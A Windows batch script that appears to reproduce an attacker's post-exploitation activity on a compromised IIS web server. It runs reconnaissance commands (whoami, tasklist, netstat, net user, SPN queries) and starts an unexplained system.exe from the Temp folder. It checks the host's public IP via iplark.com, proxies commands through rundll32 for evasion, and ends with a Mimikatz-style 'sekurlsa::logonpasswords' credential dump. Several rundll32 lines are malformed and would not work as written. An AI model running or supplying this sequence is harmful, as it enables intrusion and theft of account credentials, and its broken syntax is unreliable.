@echo off
REM Change directory to inetsrv and execute commands
cd /d "C:\Windows\System32\inetsrv"
cd /d "%temp%"
echo MbjSGy
cd
echo hfvCNk

REM List contents of the Temp directory
cd /d "C:\Windows\Temp"
dir

REM Display the current user
c:\Windows\System32\cmd.exe /c whoami

REM Start system.exe in the background
start "" /b /D C:\Windows\Temp .\system.exe

REM List tasks with services in the Temp directory
cd /d "C:\Windows\Temp"
tasklist /svc

REM List all tasks with services
c:\Windows\System32\cmd.exe /c tasklist /svc

REM Change directory to inetsrv and display the current user
cd /d "C:\Windows\System32\inetsrv"
whoami

REM List tasks with services again in the Temp directory
cd /d "C:\Windows\Temp"
tasklist /svc

REM Start system.exe again in the background
cd /d "C:\Windows\Temp"
start "" /b /D C:\Windows\Temp .\system.exe

REM Use curl to access a website
cd /d "C:\Windows\Temp"
curl iplark.com

REM Display network connections
netstat -an

REM Execute whoami using rundll32
C:\Windows\System32\rundll32.exe "cmd /c whoami"

REM Execute tasklist using rundll32
C:\Windows\System32\rundll32.exe "cmd /c tasklist /svc"

REM Query SPNs using rundll32
C:\Windows\System32\rundll32.exe "cmd /c setspn -q */*"

REM Execute ssh help using rundll32
C:\Windows\System32\rundll32.exe "cmd /c ssh -h"

REM List users using rundll32
C:\Windows\System32\rundll32.exe "cmd /c net user"

REM Run privilege escalation command
C:\Windows\System32\rundll32.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
